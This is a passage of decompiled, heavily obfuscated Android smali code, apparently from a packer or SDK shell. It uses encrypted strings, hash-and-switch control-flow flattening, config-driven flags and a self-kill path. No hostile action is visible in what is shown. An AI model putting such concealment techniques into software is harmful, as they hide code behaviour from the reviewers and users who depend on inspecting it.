    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, LCu7y/sdk/e5;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6, v2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v2, "MZXjNMmUsA==\n"

    const-string v4, "XvOFWKD61bQ=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    invoke-virtual {v6, v2, v4}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v4

    const v5, 0x3f32497c

    const-string v2, "\u06da\u06e8\u06d9\u06e7\u06e5\u06db\u06ec\u06d6\u06e6\u06d8\u06e2\u06d7\u06e4\u06d8\u06d6\u06d9\u06df\u06db\u06e4\u06e8\u06ec\u06e7\u06da\u06e8\u06e4\u06e8\u06e0\u06e0\u06e5\u06d7"

    :goto_28
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_4

    move-result v8

    xor-int/2addr v8, v5

    sparse-switch v8, :sswitch_data_19

    goto :goto_28

    :sswitch_53
    :try_start_14
    sget-object v2, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v4, "59wilO/ZmdyClS/ftfH8v4fi\n"

    const-string v5, "D3KScVBfcFk=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    const-string v2, "2A1JlsXL\n"

    const-string v4, "u2In8KysxMs=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    move-object/from16 v0, p3

    invoke-static {v0, v2, v4}, Lapi/repository/Utils;->shellSP_write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_3

    :goto_29
    :try_start_15
    const-string v2, "wVe6tH6+QQ==\n"

    const-string v4, "pT7J1RzSJOE=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    invoke-virtual {v6, v2, v4}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v4

    const v5, 0x49630bb1

    const-string v2, "\u06e6\u06e7\u06e6\u06d6\u06e4\u06d7\u06da\u06e4\u06e5\u06e8\u06e7\u06eb\u06d8\u06dc\u06d7\u06df\u06df\u06d7\u06da\u06e7\u06e5\u06e5\u06e0\u06d6\u06e0\u06e5\u06e0\u06db\u06e4\u06e5\u06d8\u06e4\u06eb\u06e6\u06d8\u06dc\u06db\u06d8\u06e0\u06e1\u06dc\u06d8\u06e1\u06e0\u06e2\u06e0\u06e5\u06e1\u06dc\u06dc\u06e2\u06db\u06dc\u06d8\u06ec\u06df\u06e6\u06d8"

    :goto_2a
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v5

    sparse-switch v8, :sswitch_data_1a

    goto :goto_2a

    :sswitch_54
    const v8, -0x15a5d001

    const-string v2, "\u06df\u06e5\u06d6\u06e0\u06d9\u06e7\u06df\u06eb\u06d8\u06eb\u06e8\u06d8\u06d9\u06e4\u06e1\u06e0\u06e0\u06df\u06dc\u06dc\u06eb\u06e8\u06df\u06dc\u06d8\u06db\u06e2\u06dc\u06db\u06e1\u06e4\u06e2\u06df\u06eb\u06e5\u06eb\u06e5\u06e5\u06d8\u06dc\u06d9\u06dc\u06e7"

    :goto_2b
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v8

    sparse-switch v9, :sswitch_data_1b

    goto :goto_2b

    :sswitch_55
    const-string v2, "\u06d8\u06e2\u06d6\u06d8\u06dc\u06e7\u06e0\u06d6\u06e2\u06e2\u06da\u06db\u06e5\u06e1\u06db\u06e8\u06d8\u06e7\u06df\u06db\u06e1\u06d9\u06d8\u06ec\u06dc\u06e2\u06e7\u06d6\u06df\u06d6\u06e5\u06dc\u06d8\u06dc\u06e1\u06d8\u06d8\u06dc\u06e1\u06e1\u06d8\u06db\u06eb\u06e8\u06dc\u06d8"

    goto :goto_2b

    :sswitch_56
    const-string v2, "\u06e6\u06d6\u06db\u06e1\u06e1\u06eb\u06e4\u06d6\u06ec\u06e0\u06ec\u06e8\u06eb\u06df\u06e8\u06e7\u06e7\u06e5\u06da\u06e8\u06d7\u06d6\u06d8\u06d8\u06d6\u06da\u06e1\u06d6\u06eb"

    goto :goto_28

    :sswitch_57
    const v8, -0x622a2a14

    const-string v2, "\u06dc\u06df\u06e5\u06d8\u06df\u06dc\u06df\u06e2\u06e5\u06d6\u06d8\u06d8\u06df\u06df\u06e8\u06dc\u06e4\u06da\u06e0\u06e2\u06d9\u06e0\u06e2\u06da\u06e8\u06da\u06e8\u06e8\u06d8\u06d8\u06e2\u06ec\u06d8\u06e8\u06ec\u06e2\u06e8\u06d8"

    :goto_2c
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v8

    sparse-switch v10, :sswitch_data_1c

    goto :goto_2c

    :sswitch_58
    const-string v2, "\u06d9\u06d9\u06d6\u06d8\u06d6\u06d8\u06df\u06eb\u06d9\u06ec\u06d8\u06d8\u06e6\u06df\u06e0\u06e5\u06e1\u06dc\u06d8\u06d7\u06db\u06e5\u06e0\u06e8\u06e7\u06d8\u06d8\u06d6\u06e8\u06e0\u06eb\u06e2\u06e5\u06e6\u06e1\u06d8\u06ec\u06d8\u06e0\u06e0\u06df\u06e6\u06d8\u06e2\u06e1\u06e7\u06e2\u06e1\u06e6\u06df\u06df\u06e1\u06e5\u06df\u06e8\u06e7\u06d9\u06d6\u06d8"

    goto :goto_2c

    :cond_a
    const-string v2, "\u06e6\u06d8\u06e4\u06e0\u06e8\u06d6\u06df\u06e4\u06e8\u06d8\u06eb\u06e2\u06db\u06d6\u06e5\u06d8\u06db\u06da\u06d9\u06ec\u06d9\u06e1\u06d7\u06e1\u06dc\u06da\u06e8\u06dc\u06e8\u06e8\u06d8\u06d8\u06d8\u06d8\u06e1\u06e1\u06da\u06db"

    goto :goto_2c

    :sswitch_59
    if-eqz v4, :cond_a

    const-string v2, "\u06e0\u06e4\u06e1\u06d8\u06e2\u06e6\u06e7\u06e6\u06df\u06e6\u06d8\u06d8\u06dc\u06e8\u06d8\u06e6\u06d9\u06e2\u06eb\u06d9\u06d8\u06d8\u06e2\u06d6\u06d8\u06d8\u06e5\u06e5\u06e8\u06e7\u06db\u06e8\u06e6\u06d9\u06e0\u06da\u06e7\u06e1\u06e1\u06d6\u06d8\u06d8\u06e6\u06e1\u06ec\u06da\u06e0\u06d8"

    goto :goto_2c

    :sswitch_5a
    const-string v2, "\u06d8\u06dc\u06e8\u06d8\u06df\u06e1\u06dc\u06eb\u06e0\u06e8\u06d9\u06da\u06d7\u06e7\u06d8\u06e6\u06e8\u06d7\u06e1\u06ec\u06df\u06df\u06db\u06db\u06eb\u06e8\u06e6\u06df\u06db\u06ec\u06e6\u06d7\u06df\u06eb\u06e5\u06e8\u06e6\u06e8\u06e1\u06d8\u06e7\u06d9\u06da\u06e2\u06e7\u06eb\u06da\u06e7\u06d8"
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_4

    goto :goto_28

    :sswitch_5b
    const-string v2, "\u06d9\u06df\u06dc\u06e4\u06eb\u06d6\u06d8\u06e6\u06da\u06d9\u06e0\u06d9\u06e5\u06d8\u06e4\u06dc\u06e8\u06df\u06d7\u06df\u06d8\u06ec\u06d8\u06d8\u06d7\u06e4\u06d6\u06e4\u06df\u06d8\u06eb\u06d9\u06da\u06e4\u06da\u06e7\u06e5\u06dc\u06eb\u06e6\u06d8\u06d8\u06d6\u06e6\u06d8\u06db\u06d6\u06db\u06d8\u06d9\u06d7\u06e7\u06e5\u06e7\u06e7\u06da\u06e5"

    goto :goto_28

    :sswitch_5c
    :try_start_16
    sget-object v2, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v4, "kf8T4CALs970th6reTXfvNDr\n"

    const-string v5, "eVGjBZ+NWls=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    const-string v2, "+Q5fF7tA\n"

    const-string v4, "mmExcdInFtk=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    move-object/from16 v0, p3

    invoke-static {v0, v2, v4}, Lapi/repository/Utils;->shellSP_write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_29

    :catch_4
    move-exception v2

    goto/16 :goto_1f

    :sswitch_5d
    const-string v2, "\u06da\u06d6\u06d6\u06d8\u06e5\u06e8\u06e6\u06d8\u06d8\u06e1\u06e6\u06d8\u06e1\u06d7\u06e8\u06d8\u06e1\u06d6\u06e8\u06d8\u06d6\u06d6\u06ec\u06df\u06e7\u06df\u06db\u06ec\u06dc\u06df\u06dc\u06da\u06eb\u06d6"

    goto :goto_2a

    :cond_b
    const-string v2, "\u06e4\u06db\u06e2\u06ec\u06d8\u06e6\u06d8\u06d6\u06df\u06e7\u06e1\u06da\u06eb\u06dc\u06d6\u06dc\u06d8\u06e0\u06e6\u06e5\u06d8\u06e1\u06e8\u06e8\u06d7\u06d9\u06d6\u06d8\u06db\u06e0\u06e8\u06e6\u06e7\u06e7"

    goto :goto_2b

    :sswitch_5e
    if-eqz v4, :cond_b

    const-string v2, "\u06ec\u06dc\u06e1\u06d8\u06d9\u06e8\u06e7\u06d8\u06df\u06e0\u06d6\u06d8\u06e7\u06e2\u06e8\u06e6\u06e8\u06e6\u06e6\u06eb\u06d9\u06d7\u06d8\u06e5\u06e0\u06ec\u06e1\u06d8\u06eb\u06d9\u06eb\u06e6\u06d6\u06d8\u06d8\u06e4\u06e1\u06dc\u06e6\u06e8\u06e5\u06e5\u06db\u06e4\u06db\u06e1\u06d8\u06da\u06e8\u06e7\u06eb\u06e8\u06d7\u06da\u06d7\u06da\u06e7\u06e5\u06e1"

    goto :goto_2b

    :sswitch_5f
    const-string v2, "\u06db\u06d6\u06df\u06e8\u06dc\u06d8\u06e2\u06e1\u06e8\u06d8\u06da\u06d6\u06e1\u06d6\u06d7\u06d9\u06df\u06d7\u06e6\u06d9\u06db\u06d8\u06d8\u06dc\u06e0\u06d8\u06d7\u06df\u06d7\u06e4\u06e4\u06d6\u06e8\u06ec\u06e6\u06e4\u06d7\u06e8\u06df\u06df\u06e6\u06d8\u06d6\u06d8\u06e7\u06df\u06e4\u06e0\u06eb\u06e6\u06d8"
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_4

    goto :goto_2a

    :sswitch_60
    const-string v2, "\u06e1\u06e2\u06e1\u06df\u06d6\u06e8\u06d8\u06da\u06e8\u06e5\u06d8\u06e4\u06d6\u06db\u06e7\u06da\u06d6\u06d8\u06d6\u06e8\u06d8\u06d8\u06da\u06ec\u06d6\u06e0\u06e6\u06e7\u06d8\u06dc\u06df\u06e6\u06d8\u06d8\u06e1\u06d8\u06d9\u06d7\u06df\u06d6\u06da\u06e0\u06e7\u06e2\u06e5\u06d7\u06e5\u06d8\u06d9\u06e8\u06e5\u06eb\u06d6\u06e8\u06d8"

    goto :goto_2a

    :sswitch_61
    :try_start_17
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v2

    invoke-static {v2}, Landroid/os/Process;->killProcess(I)V
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_3

    :goto_2d
    :sswitch_62
    return-void

    :sswitch_63
    :try_start_18
    const-string v2, "Z0kMVIQXV39tTA==\n"

    const-string v4, "AidtNuhyHxA=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    invoke-virtual {v6, v2, v4}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v4

    const v5, 0x61222bdf

    const-string v2, "\u06db\u06d6\u06e0\u06d8\u06db\u06d8\u06e4\u06d8\u06d8\u06d7\u06eb\u06ec\u06da\u06d6\u06e7\u06d8\u06e7\u06e8\u06dc\u06d8\u06df\u06d9\u06db\u06e5\u06e7\u06e6\u06d8\u06eb\u06e2\u06ec\u06d7\u06ec\u06da\u06e1\u06e6\u06df\u06ec\u06e8\u06ec\u06ec\u06e0\u06e7\u06e5\u06dc\u06d6\u06d8"

    :goto_2e
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v5

    sparse-switch v8, :sswitch_data_1d

    goto :goto_2e

    :sswitch_64
    const v8, -0xa0b0630

    const-string v2, "\u06dc\u06e0\u06d9\u06eb\u06eb\u06e5\u06d8\u06d6\u06df\u06e0\u06df\u06e5\u06eb\u06ec\u06d8\u06df\u06d7\u06d6\u06e6\u06d8\u06d6\u06db\u06d8\u06e1\u06d8\u06d8\u06d8\u06e0\u06db\u06e1\u06da\u06df\u06d6\u06d8\u06e6\u06e7\u06eb\u06dc\u06e8\u06dc\u06da\u06e7\u06eb\u06e1\u06ec\u06dc\u06d8"

    :goto_2f
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v8

    sparse-switch v9, :sswitch_data_1e

    goto :goto_2f

    :sswitch_65
    if-eqz v4, :cond_c

    const-string v2, "\u06d7\u06d7\u06ec\u06dc\u06eb\u06d6\u06d8\u06df\u06dc\u06e8\u06e2\u06e0\u06e2\u06d7\u06e2\u06db\u06e4\u06e7\u06d7\u06df\u06e0\u06d7\u06d9\u06e8\u06e4\u06e2\u06e1\u06d7\u06dc\u06ec"

    goto :goto_2f

    :sswitch_66
    const-string v2, "\u06d6\u06e4\u06e1\u06e4\u06d6\u06ec\u06e1\u06e5\u06ec\u06d8\u06eb\u06df\u06e4\u06e2\u06d8\u06e1\u06d7\u06e0\u06e8\u06e6\u06e8\u06ec\u06d9\u06e4\u06d9\u06e0\u06eb\u06e4\u06e1\u06e4\u06e8\u06d6\u06dc\u06e7\u06e5\u06d8\u06dc\u06dc\u06e8\u06eb\u06ec\u06e0\u06e4\u06e0\u06e5\u06d8\u06e7\u06dc\u06d8"

    goto :goto_2e

    :cond_c
    const-string v2, "\u06ec\u06e1\u06e0\u06e4\u06e8\u06d6\u06d8\u06db\u06db\u06da\u06df\u06ec\u06e7\u06e2\u06e1\u06e8\u06e0\u06d7\u06e8\u06e2\u06e2\u06d6\u06e2\u06e1\u06d8\u06d8\u06e2\u06da\u06d9\u06dc\u06da\u06ec\u06dc\u06e1\u06e8\u06dc\u06dc\u06ec\u06df\u06eb\u06db\u06d9\u06df\u06e7\u06ec\u06ec\u06e0\u06df\u06e6\u06e2\u06d6\u06e7\u06d8\u06eb\u06d8\u06ec"

    goto :goto_2f

    :sswitch_67
    const-string v2, "\u06eb\u06e7\u06e5\u06d9\u06df\u06d7\u06da\u06df\u06e8\u06d7\u06d8\u06db\u06da\u06e8\u06d8\u06ec\u06d9\u06e8\u06e5\u06df\u06e7\u06e0\u06e4\u06e1\u06d8\u06d9\u06eb\u06d8\u06e0\u06d8\u06e4\u06e0\u06d6\u06e2\u06d8\u06e5\u06d8\u06e5\u06df\u06d7\u06d9\u06d9\u06e8\u06d8\u06d9\u06e7\u06e5\u06d8\u06db\u06eb\u06eb\u06e2\u06da\u06e6\u06e0\u06df\u06d8"

    goto :goto_2f

    :sswitch_68
    const-string v2, "\u06e4\u06e5\u06d9\u06e1\u06d9\u06e2\u06df\u06da\u06e1\u06d8\u06d8\u06eb\u06e0\u06d7\u06eb\u06e8\u06d8\u06e0\u06eb\u06d7\u06e2\u06d6\u06dc\u06d8\u06df\u06e2\u06e6\u06d6\u06d9\u06d7\u06e7\u06e6\u06e7\u06d8\u06e2\u06e6\u06e1\u06d8\u06d9\u06e7"
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_4

    goto :goto_2e

    :sswitch_69
    const-string v2, "\u06d8\u06db\u06e5\u06d8\u06e6\u06e6\u06e7\u06d8\u06d6\u06e2\u06e1\u06d8\u06d9\u06da\u06e8\u06eb\u06e7\u06e8\u06d8\u06d9\u06e5\u06e5\u06d8\u06e0\u06d9\u06d6\u06d8\u06ec\u06d8\u06d8\u06e5\u06e0\u06df\u06da\u06dc\u06eb\u06e6\u06e6\u06e0\u06e4\u06d8\u06da\u06d8\u06e8\u06e7\u06eb\u06db\u06e4\u06d8\u06d9\u06e4\u06e4\u06e5\u06e0"

    goto :goto_2e

    :sswitch_6a
    :try_start_19
    invoke-static {}, Lcom/zyyad/gamf/UgxfpdsWPJtvNIp;->getShellContextThis()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, LCu7y/sdk/y0;->init(Landroid/content/Context;)V
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_3

    :goto_30
    :try_start_1a
    const-string v2, "X2zPxszt3ilea8/Cwg==\n"

    const-string v4, "PQCupaeyrkg=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    invoke-virtual {v6, v2, v4}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v4

    const-string v2, "ch1kIdOjYTp3J2Mf0qRhPnknfxfCuw==\n"

    const-string v5, "HHgTfrHPAFk=\n"

    invoke-static {v2, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v8

    const v5, 0x50f035fb

    const-string v2, "\u06d7\u06d9\u06e8\u06d7\u06e1\u06d8\u06d8\u06d7\u06e1\u06dc\u06e2\u06ec\u06e7\u06e7\u06d6\u06db\u06da\u06d9\u06e8\u06e5\u06e4\u06e8\u06d8\u06e0\u06da\u06e6\u06e8\u06eb\u06e2\u06d8\u06e8\u06e1\u06d8\u06eb\u06e6\u06e0\u06e0\u06df\u06ec"

    :goto_31
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_4

    move-result v9

    xor-int/2addr v9, v5

    sparse-switch v9, :sswitch_data_1f

    goto :goto_31

    :sswitch_6b
    const v4, 0x43585fe7

    const-string v2, "\u06e8\u06e2\u06df\u06df\u06e0\u06da\u06d8\u06d9\u06dc\u06e5\u06e1\u06e0\u06ec\u06d8\u06d8\u06d7\u06e6\u06e8\u06e4\u06e8\u06da\u06e4\u06db\u06eb\u06df\u06d8\u06e6\u06e4\u06db\u06db\u06dc\u06df\u06d8\u06e4\u06e2\u06e7\u06e7\u06e7\u06e0\u06e5\u06d6\u06e5\u06e4\u06db\u06e6\u06e8\u06ec"

    :goto_32
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_20

    goto :goto_32

    :sswitch_6c
    const v5, -0x4230b028

    const-string v2, "\u06e6\u06d8\u06df\u06e5\u06da\u06e1\u06d8\u06d8\u06e5\u06e7\u06d8\u06e8\u06e0\u06e8\u06e2\u06d8\u06df\u06e1\u06da\u06e8\u06d8\u06e2\u06e6\u06e8\u06da\u06e2\u06e5\u06e5\u06e7\u06e6\u06e1\u06e1\u06e6"

    :goto_33
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v5

    sparse-switch v9, :sswitch_data_21

    goto :goto_33

    :sswitch_6d
    if-eqz v8, :cond_e

    const-string v2, "\u06da\u06d8\u06df\u06e8\u06da\u06db\u06d7\u06d7\u06e6\u06e1\u06e1\u06e4\u06e4\u06d7\u06d6\u06d8\u06ec\u06dc\u06e5\u06d7\u06e7\u06eb\u06dc\u06e8\u06e6\u06d8\u06d6\u06d9\u06e5\u06ec\u06e1\u06e0\u06d7\u06e0\u06e5\u06d8\u06e4\u06e5\u06e2\u06d6\u06e4\u06df\u06e4\u06df\u06e0"

    goto :goto_33

    :sswitch_6e
    :try_start_1b
    const-string v2, "iAM7/wTydQbB1/5105caCYYcLDZd9yN/+jF0ty+UGzCIFzv/Mu14FdN7KZdd/T9x+jc=\n"

    const-string v4, "bp+RGrhykJY=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    invoke-static {v2, v4}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_30

    :sswitch_6f
    const-string v2, "\u06dc\u06db\u06e1\u06d6\u06df\u06d9\u06e7\u06e8\u06e7\u06d8\u06e7\u06d7\u06d6\u06d8\u06e8\u06db\u06e5\u06d8\u06d8\u06e2\u06e4\u06d8\u06d8\u06db\u06eb\u06e4\u06d9\u06da\u06da\u06db\u06d9\u06e2\u06e6\u06e1\u06e6\u06ec\u06e4\u06db\u06e8\u06e1\u06d7\u06df\u06e5\u06e8\u06e2\u06d9\u06da\u06dc\u06e6\u06e7\u06db\u06da\u06ec\u06df\u06e5\u06ec\u06e5\u06d8"

    goto :goto_31

    :sswitch_70
    const v9, 0x4078840b

    const-string v2, "\u06eb\u06e0\u06dc\u06d7\u06d6\u06dc\u06e7\u06d9\u06df\u06e0\u06da\u06e7\u06d8\u06d6\u06e1\u06dc\u06e6\u06e6\u06d8\u06df\u06e5\u06d8\u06d8\u06da\u06ec\u06e8\u06d8\u06e1\u06eb\u06d6\u06e1\u06d6\u06e8\u06d8"

    :goto_34
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v9

    sparse-switch v10, :sswitch_data_22

    goto :goto_34

    :sswitch_71
    if-eqz v4, :cond_d

    const-string v2, "\u06ec\u06d9\u06d6\u06eb\u06e5\u06d9\u06e1\u06e8\u06e1\u06d8\u06da\u06df\u06da\u06dc\u06e4\u06e1\u06d8\u06e5\u06ec\u06e0\u06ec\u06eb\u06e1\u06d8\u06e6\u06e0\u06d9\u06da\u06e5\u06eb\u06df\u06e2\u06eb"

    goto :goto_34

    :cond_d
    const-string v2, "\u06d9\u06db\u06d7\u06d8\u06e8\u06e0\u06ec\u06e8\u06db\u06e0\u06e5\u06e7\u06e0\u06e1\u06e2\u06e6\u06d6\u06e7\u06d8\u06e7\u06eb\u06e2\u06e5\u06da\u06e5\u06da\u06e7\u06da\u06e5\u06df\u06d8\u06d8\u06e2\u06d6\u06d6\u06d8\u06e4\u06db\u06e1"

    goto :goto_34

    :sswitch_72
    const-string v2, "\u06e8\u06dc\u06ec\u06df\u06ec\u06e8\u06d7\u06e1\u06e0\u06eb\u06e4\u06d9\u06e5\u06dc\u06dc\u06dc\u06e2\u06e8\u06d8\u06e1\u06e6\u06e1\u06d9\u06dc\u06e6\u06d8\u06e2\u06e6\u06dc\u06e6\u06eb\u06d7\u06e4\u06d8\u06e8\u06dc\u06df\u06d8\u06e5\u06dc\u06eb\u06d6\u06d9\u06db\u06e0\u06dc\u06e8\u06db\u06df\u06e8\u06d9\u06da\u06e6\u06e8\u06d8\u06d8"

    goto :goto_34

    :sswitch_73
    const-string v2, "\u06dc\u06e1\u06e5\u06e7\u06d8\u06e7\u06d7\u06d9\u06d8\u06d8\u06e0\u06eb\u06e8\u06d8\u06e8\u06e7\u06e8\u06d8\u06e4\u06d9\u06db\u06d7\u06e4\u06dc\u06e5\u06e0\u06df\u06e0\u06ec\u06df\u06e1\u06e0\u06dc\u06d8\u06e8\u06db\u06e6\u06d8\u06e1\u06d9\u06d9\u06ec\u06d9\u06e8"
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_4

    goto :goto_31

    :sswitch_74
    const-string v2, "\u06df\u06e2\u06e4\u06eb\u06d6\u06da\u06d9\u06e5\u06e0\u06e1\u06e5\u06ec\u06e6\u06e8\u06d9\u06df\u06df\u06ec\u06e6\u06db\u06da\u06e6\u06eb\u06df\u06e0\u06d7\u06e7\u06ec\u06d9\u06d8\u06d8\u06df\u06e8\u06d6\u06dc\u06e0\u06e6\u06d8\u06dc\u06dc\u06eb\u06db\u06d8\u06d8\u06e5\u06e8\u06e7\u06df\u06eb\u06dc"

    goto :goto_31

    :sswitch_75
    const-string v2, "\u06ec\u06e4\u06e6\u06d8\u06e2\u06df\u06ec\u06da\u06e0\u06df\u06ec\u06d7\u06e5\u06e6\u06e6\u06eb\u06e2\u06d9\u06e8\u06d8\u06e6\u06e5\u06e2\u06e8\u06d8\u06db\u06e6\u06e5\u06e4\u06d9\u06eb\u06e6\u06da\u06ec\u06d9\u06e5\u06e1\u06e8\u06d8\u06d7\u06e7\u06e4\u06e4\u06d8\u06e6\u06d8\u06db\u06e8\u06e6\u06ec\u06e4\u06e8\u06d6\u06d9\u06d9\u06e2\u06da\u06e5\u06d8"

    goto :goto_32

    :cond_e
    const-string v2, "\u06da\u06d9\u06e5\u06e4\u06e6\u06ec\u06da\u06e1\u06e6\u06d9\u06d6\u06dc\u06d8\u06e0\u06e7\u06e1\u06d8\u06df\u06dc\u06db\u06eb\u06e2\u06ec\u06e0\u06e7\u06e2\u06eb\u06e1\u06e6\u06d8\u06e2\u06e7\u06dc\u06d8\u06eb\u06da\u06e4\u06e0\u06d8\u06e5"

    goto :goto_33

    :sswitch_76
    const-string v2, "\u06e1\u06dc\u06d8\u06d8\u06df\u06d9\u06e4\u06e7\u06da\u06e8\u06e7\u06d7\u06e5\u06da\u06d7\u06e8\u06d8\u06e8\u06ec\u06da\u06e5\u06d8\u06d8\u06d8\u06d7\u06d8\u06dc\u06e2\u06e4\u06e2\u06e7\u06ec\u06e2\u06db\u06e4\u06df\u06da\u06e5\u06df"

    goto :goto_33

    :sswitch_77
    const-string v2, "\u06dc\u06e8\u06d7\u06ec\u06e0\u06e1\u06e1\u06e2\u06dc\u06e1\u06da\u06d8\u06d8\u06d7\u06e1\u06d7\u06e5\u06e5\u06dc\u06da\u06df\u06d9\u06e4\u06e4\u06df\u06d7\u06e8\u06d8\u06e4\u06da\u06d6"

    goto :goto_32

    :sswitch_78
    const-string v2, "\u06e7\u06d9\u06e5\u06d8\u06d7\u06e4\u06e0\u06dc\u06da\u06e4\u06e1\u06dc\u06e2\u06e0\u06e5\u06df\u06e8\u06e8\u06d8\u06da\u06e6\u06d9\u06db\u06da\u06da\u06e7\u06dc\u06e1\u06d8\u06dc\u06e4\u06ec\u06e1\u06e7\u06e0\u06db\u06e1\u06e6\u06d8\u06e2\u06eb\u06e1\u06e4\u06e2\u06da\u06d8\u06e5\u06dc\u06ec\u06db\u06e4\u06e8\u06e1\u06e6\u06d8\u06d9\u06e6\u06e7\u06d8"

    goto :goto_32

    :sswitch_79
    const v4, -0x694dc238

    :try_start_1c
    const-string v2, "\u06db\u06ec\u06ec\u06da\u06db\u06d6\u06eb\u06e7\u06e8\u06d7\u06df\u06e7\u06d7\u06e1\u06e1\u06d8\u06e4\u06db\u06e1\u06ec\u06e7\u06dc\u06d8\u06d9\u06e7\u06da\u06d8\u06e5\u06e6\u06d8\u06d7\u06e4\u06da\u06d8\u06e2\u06db\u06dc\u06db\u06e4\u06da\u06e0\u06d8\u06df\u06e5\u06d8\u06d8\u06e5\u06eb\u06e1\u06d7\u06e8"

    :goto_35
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_23

    goto :goto_35

    :sswitch_7a
    const/4 v2, 0x0

    move v5, v2

    :goto_36
    const v4, -0x69c9c3ab

    const-string v2, "\u06e4\u06ec\u06df\u06da\u06e7\u06e5\u06e5\u06e8\u06d8\u06e8\u06e6\u06e8\u06e2\u06dc\u06e1\u06e2\u06da\u06e7\u06eb\u06d8\u06d8\u06e6\u06e7\u06e2\u06eb\u06e1\u06e5\u06d8\u06e5\u06da\u06d8\u06eb\u06ec\u06da\u06ec\u06e0\u06da\u06e8\u06db\u06eb\u06e2\u06e5\u06d8\u06e0\u06e5\u06e5\u06df\u06da\u06da\u06e6\u06d6\u06d8\u06e8\u06df\u06e4"

    :goto_37
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_4

    move-result v9

    xor-int/2addr v9, v4

    sparse-switch v9, :sswitch_data_24

    goto :goto_37

    :sswitch_7b
    :try_start_1d
    sput-object v6, LCu7y/sdk/e5;->b:Lorg/json/JSONObject;

    const-string v2, "1putPzY=\n"

